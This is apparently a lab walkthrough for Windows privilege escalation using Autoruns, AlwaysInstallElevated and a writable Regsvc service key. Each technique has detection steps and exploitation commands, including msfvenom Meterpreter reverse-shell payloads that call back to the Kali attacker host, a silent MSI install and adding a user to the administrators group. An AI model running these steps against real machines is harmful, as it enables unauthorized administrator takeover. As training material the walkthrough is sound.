## Escalation via Autoruns

### Detection

Windows VM

```sh

# Open command prompt and type: 
> C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
# In Autoruns, click on the ‘Logon’ tab.
#From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
#In command prompt type: 
> C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
#From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.
```


### Exploitation

Kali VM
```sh
# Open command prompt and type: 
> msfconsole
In Metasploit (msf > prompt) type: use multi/handler
In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
In Metasploit (msf > prompt) type: run

#Open an additional command prompt and type: 
> msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
#Copy the generated file, program.exe, to the Windows VM.
```

Windows VM
```sh
#Place program.exe in ‘C:\Program Files\Autorun Program’.
#To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
```

Kali VM
```sh
#Wait for a new session to open in Metasploit.
In Metasploit (msf > prompt) type: sessions -i [Session ID]
#To confirm that the attack succeeded, 
In Metasploit (msf > prompt) type: getuid
```


## Escalation via AlwaysInstallElevated

###Detection

Windows VM
```sh
# Open command prompt and type: 
> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
# From the output, notice if “AlwaysInstallElevated” value is 1.
# In command prompt type: 
> reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# From the output, notice if “AlwaysInstallElevated” value is 1.
```


### Exploitation

Kali VM
```sh 
# Open command prompt and type: 
> msfconsole
In Metasploit (msf > prompt) type: use multi/handler
In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
In Metasploit (msf > prompt) type: run

# Open an additional command prompt and type: 
> msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
# Copy the generated file, setup.msi, to the Windows VM.
```

Windows VM
```sh
# Place ‘setup.msi’ in ‘C:\Temp’.
# Open command prompt and type: 
> msiexec /quiet /qn /i C:\Temp\setup.msi

Ta Da!! Enjoy your shell! :)
```

## Escalation via Regsvc 

### Detection

Windows VM
```sh
# Open powershell prompt and type: 
> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# Notice if the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.
```


### Exploitation

Windows VM
```sh
# Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.
```

Kali VM
```sh
# Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
# Exit the text editor and compile the file by typing the following in the command prompt: 
>x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
# Copy the generated file x.exe, to the Windows VM. (use server or ftp to share)
```

Windows VM
```sh
# Place x.exe in ‘C:\Temp’.
# Open command prompt at type: 
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
# In the command prompt type: 
> sc start regsvc
# It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 
> net localgroup administrators
```
